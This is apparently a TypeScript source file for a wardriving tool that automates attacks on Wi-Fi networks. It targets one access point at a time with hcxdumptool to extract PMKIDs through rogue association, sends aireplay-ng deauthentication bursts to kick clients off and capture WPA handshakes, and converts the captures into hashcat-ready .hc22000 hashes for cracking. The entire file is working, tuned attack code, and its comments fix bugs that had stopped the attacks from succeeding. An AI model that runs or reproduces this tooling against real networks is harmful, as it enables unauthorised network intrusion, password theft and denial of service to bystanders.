import { spawn, execFile, ChildProcess } from "child_process";
import { promisify } from "util";
import { EventEmitter } from "events";
import fs from "fs";
import path from "path";
import { ringFiles } from "./capture";

const execFileAsync = promisify(execFile);

// Attack runners for the wardrive module (driving capture, docs/wardrive.md).
//
// PMKID FIRST: hcxdumptool pointed at ONE AP (compiled BPF) asks the AP
// directly for its PMKID (RSN IE) — works with zero connected clients, no
// deauth noise. hcxdumptool manages its own monitor mode, channel lock and
// virtual MAC; do NOT pre-lock the channel with iw (hcxdumptool refuses to
// start on an iface someone else already put in monitor mode) and do NOT
// run it in parallel with the continuous dumpcap|tshark discovery pipeline
// (same iface): the service pauses the discovery capture while the PMKID
// round runs, then restarts it.
//
// extractEapolToSession() is the ONLY way an EAPOL/PMKID sighting becomes
// an artifact: hcxpcapngtool runs over the captured pcapng, writes the
// .hc22000 hash and reports whether real material was present. A "hit"
// without material never marks the network captured.
//
// DeauthOpRunner stays as the SECONDARY mechanism for APs that ignore the
// PMKID request — short directed bursts, rounds repeat while in range.

const BURST_DEFAULT = 16; // small burst per round; rounds repeat while in range

export async function extractEapolToSession(
  bssid: string,
  ringDir: string,
  sessionDir: string,
): Promise<{ ok: boolean; capFile: string; hashFile: string; eapolPairs: number }> {
  const prefix = bssid.replace(/:/g, "").toLowerCase();
  const destCap = path.join(sessionDir, `${prefix}.cap`);
  const destHash = path.join(sessionDir, `${prefix}.hc22000`);
  const tmpHash = `${destHash}.tmp`;
  const files = ringFiles(ringDir);
  let best = 0;
  let bestSrc: string | null = null;
  for (const f of files.reverse()) {
    // Newest first: the frames we just caused are in the freshest file.
    try {
      const { stdout, stderr } = await execFileAsync("hcxpcapngtool", ["-o", tmpHash, f], {
        timeout: 30_000,
      });
      const text = `${stdout}\n${stderr}`;
      const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
      const written = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
      if (written > best) {
        best = written;
        bestSrc = f;
      }
    } catch {
      // Ring file may have rotated away mid-run — try the next one.
    }
  }
  try {
    fs.unlinkSync(tmpHash);
  } catch {
    // nothing written
  }
  if (best === 0 || !bestSrc) return { ok: false, capFile: "", hashFile: "", eapolPairs: 0 };
  try {
    fs.copyFileSync(bestSrc, destCap);
    const { stdout, stderr } = await execFileAsync("hcxpcapngtool", ["-o", destHash, bestSrc], {
      timeout: 30_000,
    });
    const text = `${stdout}\n${stderr}`;
    const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
    const written = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
    const hashOk = written > 0 && fs.existsSync(destHash) && fs.statSync(destHash).size > 0;
    return {
      ok: hashOk,
      capFile: hashOk ? path.basename(destCap) : "",
      hashFile: hashOk ? path.basename(destHash) : "",
      eapolPairs: written,
    };
  } catch {
    return { ok: false, capFile: "", hashFile: "", eapolPairs: 0 };
  }
}

// Convert ONE capture file (hcxdumptool .pcapng or airodump .cap) to the
// hashcat -m 22000 hash. Uses hcxpcapngtool --all: without it, M1M2ROGUE
// pairs (hcxdumptool's own association attempts) are refused and a real
// PMKID handshake could be discarded.
export async function convertCaptureToHash(
  pcapngPath: string,
  hashPath: string,
): Promise<{ ok: boolean; eapolPairs: number; pmkidCount: number }> {
  try {
    const { stdout, stderr } = await execFileAsync(
      "hcxpcapngtool",
      ["--all", "-o", hashPath, pcapngPath],
      { timeout: 30_000 },
    );
    const text = `${stdout}\n${stderr}`;
    const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
    const eapolPairs = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
    const pmkidMatch = /PMKID written to .+?:\s*(\d+)/i.exec(text);
    const pmkidCount = pmkidMatch ? parseInt(pmkidMatch[1], 10) : 0;
    const ok = (eapolPairs > 0 || pmkidCount > 0) && fs.existsSync(hashPath) && fs.statSync(hashPath).size > 0;
    return { ok, eapolPairs, pmkidCount };
  } catch {
    return { ok: false, eapolPairs: 0, pmkidCount: 0 };
  }
}

// Extract ONE AP's frames from a full-channel dumpcap capture. The attack
// window writes EVERYTHING (beacons, deauths, EAPOL from every AP on the
// channel); hcxpcapngtool needs the capture narrowed to a single BSSID.
// tshark -Y filters; -w writes the per-AP pcapng. Returns true when frames
// for this BSSID exist.
export async function extractApFrames(
  bssid: string,
  fullCapture: string,
  perApPcapng: string,
): Promise<{ ok: boolean; frames: number }> {
  const mac = bssid.toLowerCase();
  try {
    await execFileAsync("tshark", [
      "-r", fullCapture,
      "-Y", `wlan.bssid == ${mac} || wlan.addr3 == ${mac} || wlan.addr4 == ${mac} || wlan.addr1 == ${mac} || wlan.addr2 == ${mac}`,
      "-w", perApPcapng,
    ], { timeout: 60_000 });
    const frames = fs.existsSync(perApPcapng) ? fs.statSync(perApPcapng).size : 0;
    return { ok: frames > 24, frames }; // >24B header = at least one frame
  } catch {
    return { ok: false, frames: 0 };
  }
}

// ─── hcxdumptool BPF (single-AP targeting) ───────────────────────────────────
// hcxdumptool 6.3.5 dropped --filterlist_ap; targeting is done with a BPF
// compiled by hcxdumptool's own --bpfc (no tcpdump needed). It must cover
// EVERY address slot the AP's frames use, or hcxdumptool goes deaf for the
// very AP it is attacking:
//   addr2 = BSSID on every frame the AP transmits (beacons, probe/assoc
//           responses, data) — beacons/responses never appear in addr3
//   addr3 = BSSID on EAPOL/data from-DS frames
//   addr4 = WDS corner case
// (addr3/addr4 only was the old filter: it silently dropped the AP's
// beacons and assoc-responses — addr1 is hcxdumptool's vMAC there and
// addr3 is broadcast/client — so association never completed and every
// PMKID attack reported "AP no respondió".)
export async function compileBpfForAp(bssid: string): Promise<string | null> {
  const mac = bssid.toLowerCase().replace(/:/g, "");
  try {
    const { stdout } = await execFileAsync("hcxdumptool", [
      "--bpfc",
      `wlan addr2 ${mac} || wlan addr3 ${mac} || wlan addr4 ${mac}`,
    ]);
    const bpf = stdout.trim();
    return bpf.length > 0 ? bpf : null;
  } catch {
    return null;
  }
}

// ─── PMKID runner (attacker) + dumpcap (writer) ──────────────────────────────
// ARCHITECTURE (the pwnagotchi lesson, adapted to tools we verified on the
// Pi): hcxdumptool's RDS on rt2800usb SEES the EAPOL (260 M1, 74 M1M2M3 in
// 90s vs akbal_lab) but its `-w` writer only puts 2 packets in the pcapng —
// the frames are lost inside hcxdumptool's capture→filter→write chain, not
// at the radio. Fix: hcxdumptool WITHOUT -w (attacker only: PMKID requests
// + deauths), and a SEPARATE dumpcap (which we verified writes correctly —
// the discovery ring captures 800+ frames/file) writing EVERYTHING on the
// locked channel. tshark extracts the AP's frames afterwards and
// hcxpcapngtool --all converts to .hc22000.
//
// One caveat of running both on one iface: hcxdumptool re-enters monitor
// mode itself and sets the channel — dumpcap started AFTER it just reads
// whatever the iface sees (both receive the same frames).

export class PmkidDriveRunner extends EventEmitter {
  private proc: ChildProcess | null = null;
  private dumpcap: ChildProcess | null = null;
  private running = false;
  private buffer = "";

  constructor(
    private iface: string,
    private bssid: string,
    private pcapngPath: string, // now written by DUMPCAP (not hcxdumptool)
    private channel: number,
    private windowMs: number,
    private bpfFile: string,
  ) {
    super();
  }

  // hcxdumptool 6.3.5 flags used here (NO -w: the separate dumpcap writes):
  //   -i iface       : manages its own monitor mode + channel + virtual MAC
  //   -c <N>a        : lock to the target channel ("a" = 2GHz band suffix)
  //   --bpf=<file>   : attack ONLY this AP (writeBpfForAp wrote it)
  //   --attemptapmax : beacons that trigger a PMKID request before stopping.
  //                    CAUTION: 0 does NOT mean "unlimited" — 0 DISABLES the
  //                    whole active attack (deauth/proberequest/association
  //                    all get switched off, verified in 6.3.5 --help), and
  //                    hcxdumptool then sits passively for the whole window:
  //                    every PMKID run reported "El AP no respondió". A large
  //                    value keeps the AP attack alive for the full window
  //                    (default 4 beacons ≈ 2s is also too short).
  //   --tot=<min>    : hard exit timer (ceil of the window, min 1 minute)
  //   --errormax=200 : tolerate malformed frames on a busy channel
  //   --rds=1        : status lines to stderr (parsed for [PMKID...] hits)
  //   -w /dev/null   : hcxdumptool still demands -w on some builds; the
  //                    null-file keeps it from creating a partial dump that
  //                    would shadow our dumpcap file.
  start(): void {
    this.launch(true);
  }

  // Deauth-enabled variant: the SAME single-AP window, but WITHOUT
  // --exitoneapol (so it keeps attacking through the whole window) —
  // hcxdumptool's built-in directed deauths do the forcing.
  startWithDeauth(): void {
    this.launch(false);
  }

  private launch(exitOnEapol: boolean): void {
    if (this.running) return;
    this.running = true;
    const args = [
      "sudo", "-n", "hcxdumptool",
      "-i", this.iface,
      "-w", "/dev/null",
      "-c", `${this.channel}a`,
      "--bpf", this.bpfFile,
      // Active AP attack (PMKID request via rogue association) for the
      // whole window — NOT 0, which disables the attack entirely (see the
      // flag comment above; that was the "El AP no respondió" bug).
      "--attemptapmax", "500",
    ];
    if (exitOnEapol) args.push("--exitoneapol", "3");
    args.push(
      "--tot", String(Math.max(1, Math.ceil(this.windowMs / 60_000))),
      "--errormax", "200",
      "--rds=1",
    );
    this.proc = spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "ignore", "pipe"] });
    this.proc.stderr?.on("data", (chunk: Buffer) => this.onStderr(chunk));
    this.proc.on("exit", (code, signal) => {
      const stillRunning = this.running;
      this.running = false;
      this.emit("exit", { code, signal, intentional: !stillRunning });
    });
    this.proc.on("error", (err) => {
      if (!this.running) return;
      this.running = false;
      this.emit("exit", { code: -1, signal: null, intentional: false, error: err?.message });
    });

    // dumpcap WRITER — starts right after hcxdumptool (which owns the
    // iface). hcxdumptool takes the iface down and re-ups it in monitor
    // mode during its init, so dumpcap retries a few times until the
    // iface is up (up to ~3s), then runs for the whole window.
    const cap = this;
    const startDumpcap = (attempt: number): void => {
      if (!cap.running) return;
      // NO sudo: with file capabilities on the binary (already applied on
      // the device) running dumpcap as the SERVICE USER works for both the
      // monitor iface capture and writing into ~/wardrive-sessions — the
      // same lesson as wardrive/capture.ts. Under sudo, dumpcap drops
      // privileges to SUDO_USER and loses $HOME write access.
      cap.dumpcap = spawn(
        "dumpcap",
        ["-i", cap.iface,
         "-w", cap.pcapngPath,
         "-s", "2560", // radiotap header + full 802.11 + EAPOL (562B+VLANs):
         // 256 and even 1024 truncated frames (caplen != len, AWDL/EAPOL
         // 366-562B) and hcxpcapngtool discarded every pair
         "-q"],
        { detached: true, stdio: ["ignore", "ignore", "pipe"] },
      );
      cap.dumpcap.stderr?.on("data", (chunk: Buffer) => {
        const text = chunk.toString("utf8").trim();
        if (text && !/^Capturing on|Running as user|packets captured|^File:/i.test(text)) {
          console.warn("[wardrive] attack-dumpcap:", text);
          // The iface was still down when we raced hcxdumptool's init —
          // retry up to 6 times with a 700ms gap.
          if (/not up/i.test(text) && attempt < 4) {
            cap.dumpcap = null;
            setTimeout(() => startDumpcap(attempt + 1), 700);
          }
        }
      });
      cap.dumpcap.on("exit", (code) => {
        if (code && code !== 0 && cap.running) {
          console.warn(`[wardrive] attack-dumpcap exited early (code ${code})`);
        }
      });
    };
    setTimeout(() => startDumpcap(0), 400); // after hcxdumptool's first init beat
  }

  private onStderr(chunk: Buffer): void {
    this.buffer += chunk.toString("utf8");
    let nl: number;
    while ((nl = this.buffer.indexOf("\n")) >= 0) {
      const line = this.buffer.slice(0, nl).trim();
      this.buffer = this.buffer.slice(nl + 1);
      if (!line) continue;
      // RDS confirmation markers: [PMKID:...] on a successful PMKID request,
      // EAPOL M1M2M3 lines for a full handshake.
      if (/\[PMKID/.test(line) || /M1M2M3|M2M3/i.test(line)) {
        this.emit("hit", { line });
      }
    }
  }

  stop(): void {
    this.running = false;
    killGroup(this.dumpcap);
    this.dumpcap = null;
    killGroup(this.proc);
    this.proc = null;
  }

  isRunning(): boolean {
    return this.running;
  }
}

// Compile the BPF to a temp file BEFORE constructing the runner (the runner
// only reads it at spawn). Returns the file path, or null when hcxdumptool's
// compiler failed (caller skips PMKID for that round).
export async function writeBpfForAp(bssid: string, bpfFile: string): Promise<string | null> {
  const bpf = await compileBpfForAp(bssid);
  if (!bpf) return null;
  try {
    fs.writeFileSync(bpfFile, bpf + "\n");
    return bpfFile;
  } catch {
    return null;
  }
}

export class DeauthOpRunner {
  private proc: ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private clientMac: string | null,
    private count: number = BURST_DEFAULT,
  ) {}

  start(): void {
    if (this.running) return;
    this.running = true;
    const args = ["sudo", "-n", "aireplay-ng", "--deauth", String(this.count), "-a", this.bssid];
    if (this.clientMac) args.push("-c", this.clientMac);
    args.push("-D", this.iface);
    this.proc = spawnDetached(args);
  }

  stop(): void {
    this.running = false;
    killGroup(this.proc);
    this.proc = null;
  }

  isRunning(): boolean {
    return this.running;
  }
}

// Minimal detached spawn + group kill (full versions in wifi-audit/attack.ts
// and wifiradar/capture.ts carry more guards; this one covers the same ESRCH
// races those comments document).
function spawnDetached(args: string[]): ChildProcess {
  return spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "ignore", "ignore"] });
}

function killGroup(proc: ChildProcess | null): void {
  if (!proc?.pid) return;
  try {
    process.kill(-proc.pid, "SIGTERM");
  } catch {
    try {
      proc.kill("SIGTERM");
    } catch {
      // Already gone.
    }
  }
}